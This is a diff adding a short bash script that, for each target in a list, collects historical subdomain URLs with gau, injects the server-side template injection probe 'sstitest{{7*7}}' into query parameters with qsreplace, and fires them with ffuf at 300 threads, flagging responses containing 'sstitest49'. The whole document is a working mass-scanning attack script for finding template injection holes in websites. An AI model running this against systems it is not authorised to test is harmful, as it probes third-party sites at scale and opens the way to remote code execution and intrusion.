@@ -1,0 +1,7 @@
+
+for word in $(cat $1);
+do
+dir=/home/recon/$word/
+cat $dir/subdomains.txt| gau -subs | grep = | qsreplace "sstitest{{7*7}}" > $dir/wordlist.txt
+ffuf -u FUZZ -w $dir/wordlist.txt -mr "sstitest49" -t 300 -o $dir/ssti.txt;
+done
